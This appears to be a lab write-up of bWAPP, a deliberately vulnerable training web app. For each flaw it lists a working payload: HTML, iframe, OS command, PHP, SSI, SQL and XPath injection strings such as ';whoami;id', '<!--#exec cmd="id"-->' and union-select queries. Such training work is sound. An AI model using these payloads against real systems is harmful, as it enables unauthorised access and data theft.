<b>Vulnerability:</b> HTML Injection - Reflected(GET) 

<b>Payload:</b> ```<h1><b>injection</b></h1>```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/HTML-injection-reflected(get).png?raw=true)

<b>Reason:</b> As you can see in the screenshot above, there is no input validation for data coming via get request.
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/html-injection-reflected(get)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> HTML Injection - Reflected(POST) 

<b>Payload:</b> ```<h1><b>injection</b></h1>```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/HTML-injection-reflected(post).png?raw=true)

<b>Reason:</b> As you can see in the screenshot above, there is no input validation for data coming via post request.
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/html-injection-reflected(get)-reason.png?raw=true)


<br><br>

<b>Vulnerability:</b> HTML Injection - Reflected(URL) 

<b>Payload:</b> ```<h1><b>injection</b></h1>```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/HTML-injection-reflected(url).png?raw=true)

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/HTML-injection-reflected(url)2.png?raw=true)

<b>Reason:</b> As you can see in the screenshot above, there is no input validation for data coming from URL.
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/HTML-injection-reflected(url)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> HTML Injection - Stored(Blog) 

<b>Payload:</b> ```<h1><b>injection</b></h1>```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/HTML%20injection-stored(blog).png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, input validation is only for SQLInjection. There is no input validation for HTML tag escaping etc.
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/HTML%20injection-stored(blog)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> IFrame Injection 

<b>Payload:</b> https://google.com

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/iframeinjection.png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation for data coming from URL. We can not see the page for google because of Google's policy. However, we can understand that we can inject malicious site into the iframe.
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/iframeinjection-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> OS Command Injection

<b>Payload:</b> ```www.nsa.gov;whoami;id```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/os-command-injection.png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation for search parameter.
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/os-command-injection-reason.png?raw=true)


<br><br>

<b>Vulnerability:</b> OS Command Injection- Blind

<b>Payload:</b> ```$(sleep 5;echo 8.8.8.8)```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/os-command-injection-blind.png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation for search parameter.
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/os-command-injection-reason.png?raw=true)



<br><br>

<b>Vulnerability:</b> PHP Code Injection

<b>Payload:</b> ```phpinfo()```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/php-injection.png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation for search parameter. So, server runs the php code directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/php-injection-reason.png?raw=true)


<br><br>

<b>Vulnerability:</b> Server Side Includes(SSI) Injection

<b>Payload:</b> ```<!--#exec cmd="id"-->```<br>```<!--#exec cmd="whoami"-->```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/ssi-injection1.png?raw=true)
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/ssi-injection2.png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/html-injection-reflected(get)-reason.png?raw=true)



<br><br>

<b>Vulnerability:</b> SQL Injection (GET/Search)

<b>Payload:</b> ```' or 1=1#```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(get-search).png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(get-search)reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection (GET/Select)

<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(get-select).png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(get-search)reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection (POST/Search)

<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-search).png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-search)-reason.png?raw=true)


<br><br>

<b>Vulnerability:</b> SQL Injection (POST/Select)

<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7--```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-select.png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-select)-reason.png?raw=true)



<br><br>

<b>Vulnerability:</b> SQL Injection (AJAX/JSON/JQuery)

<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(ajax-json-jquery).png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(ajax-json-jquery)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection (Login Form/Hero)

<b>Payload:</b> ```superhero' or 1=1#```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-hero).png?raw=true)


<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input for username used directly in SQL statement. It causes the query to return true for password check.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-hero)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection (Login Form/User)

<b>Payload:</b> ```' order by 9#```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-user).png?raw=true)


<b>Reason:</b> With the payload provided above, we proved that there is SQL Injection vulnerability. We can go further from that point. It is because of the query in the screenshot below.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-user)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection (SQLite)

<b>Payload:</b> ```'and 1=0 union select 1,sqlite_version(),3,4,5,6-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(sqlite).png?raw=true)


<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by user used in the sql query directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(sqlite)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection - Stored(Blog)

<b>Payload:</b> ```',(select @@version))-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-blog).png?raw=true)


<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by user used in the sql query directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-blog)-reason.png?raw=true)


<br><br>

<b>Vulnerability:</b> SQL Injection - Stored(SQLite)

<b>Payload:</b> ```',(select sqlite_version()))-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-sqlite)1.png?raw=true)
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-sqlite)2.png?raw=true)

<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by user used in the sql query directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-sqlite)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection - Stored(User-Agent)

<b>Payload:</b> ```',(select @@version))-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-user-agent)1.png?raw=true)
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-user-agent)2.png?raw=true)

<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by HTTP request package's User Agent field used in the sql query directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-user-agent)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection - Stored(XML)

<b>Payload:</b> ```bee' (select 0 from test) '```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(stored-xml).png?raw=true)

<b>Reason:</b> The input provided by user, sent inside xml query. When we manipulate the query, we can see that there is Error based SQL Injection. We can go further from there.<br>

<br><br>

<b>Vulnerability:</b> SQL Injection - Blind - Boolean Based

<b>Payload:</b> ```' or 1=1-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(blind-booleanbased.png?raw=true)

<b>Reason:</b> There is boolean based sql injection. It does not give us any data. However, we can make inferences from application's behaviors. When we give true statement it prints something, when it is false statement the printing changes. So, we can go further from this point.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(blind-booleanbased)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection - Blind - (Web Services/SOAP)

<b>Payload:</b> ```' and (select sleep(10) from users)-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(blind-timebased.png?raw=true)

<b>Reason:</b> There is time based sql injection. It does not give us any data. However, we can make inferences from application's behaviors. When we give sleep command to the database, it sleeps. So, we can go further from that point.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(blind-timebased)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> SQL Injection - Blind - Time Based

<b>Payload:</b> ```' and 1=1-- -```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(blind-ws-soap)1.png?raw=true)
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(blind-ws-soap)2.png?raw=true)

<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by user used in the sql query directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(blind-ws-soap)-reason.png?raw=true)

<br><br>

<b>Vulnerability:</b> XML/XPath Injection (Login Form)

<b>Payload:</b> ```superhero' or 1=1 or 'a'='a```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/xml-xpathinjection(loginform).png?raw=true)

<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by user used in the xpath query directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/xml-xpathinjection(loginform)-reason.png?raw=true)


<br><br>

<b>Vulnerability:</b> XML/XPath Injection (Search)

<b>Payload:</b> ```action')]/password|a[contains(a,'```

<b>Screenshot:</b>

![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/xml-xpathinjection(search).png?raw=true)

<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by user used in the xpath query directly.<br>
![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/xml-xpathinjection(search)-reason.png?raw=true)



